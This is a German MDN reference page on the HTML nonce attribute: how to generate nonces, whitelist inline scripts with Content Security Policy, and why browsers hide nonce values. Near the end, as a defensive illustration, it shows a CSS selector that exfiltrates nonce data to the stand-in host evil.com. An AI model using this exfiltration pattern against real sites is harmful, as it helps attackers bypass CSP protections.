---
title: HTML nonce-Globalattribut
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: dc788bf0ea36cb1ebe809c82aaae2c77cb3e18c0
---

Das **`nonce`**-[Globalattribut](/de/docs/Web/HTML/Reference/Global_attributes) ist ein Inhaltsattribut, das eine kryptografische {{Glossary("Nonce", "Nonce")}} ("number used once") definiert, die von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Abruf für ein gegebenes Element erlaubt ist oder nicht.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um spezifische Elemente, wie beispielsweise ein bestimmtes Inline-Skript oder Style-Elemente, auf eine Positivliste zu setzen. Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP) `unsafe-inline`-Direktive zu vermeiden, welche _alle_ Inline-Skripte oder Styles auf eine Positivliste setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen es keine Möglichkeit gibt, unsichere Inline-Skript- oder Stil-Inhalte zu vermeiden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen auch einen CSP-Hash verwenden. (Siehe Nutzungshinweise zu [unsicherem Inline-Skript](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).) Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/Guides/CSP)-Schutzmechanismen zu nutzen und Nonces oder unsichere Inline-Scripts wann immer möglich zu vermeiden.

### Verwendung von nonce zur Positivliste eines `<script>`-Elements

Es gibt einige Schritte, um ein Inline-Skript mit Hilfe des Nonce-Mechanismus auf eine Positivliste zu setzen:

#### Werte generieren

Generieren Sie von Ihrem Webserver aus einen zufälligen, base64-kodierten String mit mindestens 128 Bit Daten von einem kryptografisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal neu generiert werden, wenn die Seite geladen wird (Nonce nur einmal verwenden!). Zum Beispiel in Node.js:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Inline-Skript auf die Positivliste setzen

Die auf Ihrem Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Positivliste setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem [`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)-Header senden (vorangestellt mit `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Verbergen von Nonces

Aus Sicherheitsgründen ist das `nonce`-Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu stehlen, die Daten von Inhaltsattributen abrufen können, wie dieses:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
